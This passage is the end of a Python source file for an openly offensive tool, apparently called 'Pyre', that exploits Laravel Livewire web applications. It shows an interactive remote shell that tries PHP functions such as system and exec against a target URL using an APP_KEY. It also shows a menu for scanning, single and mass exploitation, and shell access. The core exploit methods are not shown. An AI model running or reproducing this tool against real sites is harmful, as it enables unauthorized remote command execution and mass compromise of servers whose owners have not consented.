                if not (output.startswith('<!DOCTYPE') or output.startswith('<html') or '<head>' in output[:200]):
                    print(f"{output}\n")
                else:
                    print(f"{R}[!]{RST} Returned HTML instead of command output\n")
            else:
                print(f"{R}[!]{RST} Command execution failed\n")
        
        except KeyboardInterrupt:
            print(f"\n{Y}[*]{RST} Interrupted. Type 'exit' to quit.\n")
            continue
        except Exception as e:
            print(f"{R}[ERROR]{RST} {e}\n")


def interactive_shell_with_key(scanner: LivewireExploit):
    """Option 5: Interactive shell WITH APP_KEY"""
    target = input(f"{C}[?]{RST} Target URL: ").strip()
    
    if not target:
        print(f"{R}[!]{RST} Target required\n")
        return
    
    target = normalize_url(target)
    
    app_key = input(f"{C}[?]{RST} APP_KEY (base64:...): ").strip()
    
    if not app_key:
        print(f"{R}[!]{RST} APP_KEY required\n")
        return
    
    print(f"{Y}[TIP]{RST} Type 'exit' to quit shell\n")
    
    # Auto-detect working function
    functions = ["system", "passthru", "exec", "shell_exec"]
    working_function = None
    
    print(f"{C}[*]{RST} Auto-detecting working function...")
    for func in functions:
        print(f"{C}[TRYING]{RST} {func}... ", end='')
        output = scanner.exploit_with_appkey(target, app_key, func, "echo PYRE_TEST", verbose=False)
        if output and "PYRE_TEST" in output:
            print(f"{G}OK{RST}")
            working_function = func
            break
        print(f"{R}FAILED{RST}")
    
    if not working_function:
        print(f"\n{R}[!]{RST} No working function found. Shell unavailable.\n")
        return
    
    print(f"\n{G}[+]{RST} Starting interactive shell on {target}")
    print(f"{G}[+]{RST} APP_KEY: {app_key[:20]}...")
    print(f"{G}[+]{RST} Using function: {working_function}\n")
    
    first_command = False
    
    while True:
        try:
            command = input(f"{C}Pyre>{RST} ").strip()
            
            if not command:
                continue
            
            if command.lower() in ['exit', 'quit', 'q']:
                print(f"\n{Y}[*]{RST} Exiting shell...\n")
                break
            
            # Use the working function
            output = scanner.exploit_with_appkey(target, app_key, working_function, command, verbose=False)
            
            if output:
                if not (output.startswith('<!DOCTYPE') or output.startswith('<html') or '<head>' in output[:200]):
                    print(f"{output}\n")
                else:
                    print(f"{R}[!]{RST} Returned HTML instead of command output\n")
            else:
                print(f"{R}[!]{RST} Command execution failed\n")
        
        except KeyboardInterrupt:
            print(f"\n{Y}[*]{RST} Interrupted. Type 'exit' to quit.\n")
            continue
        except Exception as e:
            print(f"{R}[ERROR]{RST} {e}\n")


# ==================== MAIN ====================
def main():
    """Main menu loop"""
    exploit_scanner = LivewireExploit(timeout=10)
    vuln_scanner = LivewireScanner(timeout=10)
    
    while True:
        show_menu()
        
        choice = input(f"{C}[?]{RST} Select option: ").strip()
        
        if choice == '0':
            print(f"\n{Y}[*]{RST} Exiting...\n")
            break
        
        elif choice == '1':
            scan_targets(vuln_scanner)
        
        elif choice == '2':
            # Exploit WITHOUT APP_KEY - show submenu
            submenu = show_exploit_submenu()
            if submenu == '1':
                exploit_single_without_key(exploit_scanner)
            elif submenu == '2':
                exploit_mass_without_key(exploit_scanner)
            elif submenu == '0':
                continue
            else:
                print(f"{R}[!]{RST} Invalid option\n")
                continue
        
        elif choice == '3':
            # Exploit WITH APP_KEY - show submenu
            submenu = show_exploit_submenu()
            if submenu == '1':
                exploit_single_with_key(exploit_scanner)
            elif submenu == '2':
                exploit_mass_with_key(exploit_scanner)
            elif submenu == '0':
                continue
            else:
                print(f"{R}[!]{RST} Invalid option\n")
                continue
        
        elif choice == '4':
            interactive_shell_without_key(exploit_scanner)
        
        elif choice == '5':
            interactive_shell_with_key(exploit_scanner)
        
        else:
            print(f"{R}[!]{RST} Invalid option\n")
            continue
        
        input(f"\n{Y}Press Enter to continue...{RST}")
        print("\n" * 2)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!]{RST} Interrupted by user\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[ERROR]{RST} {e}\n")
        sys.exit(1)
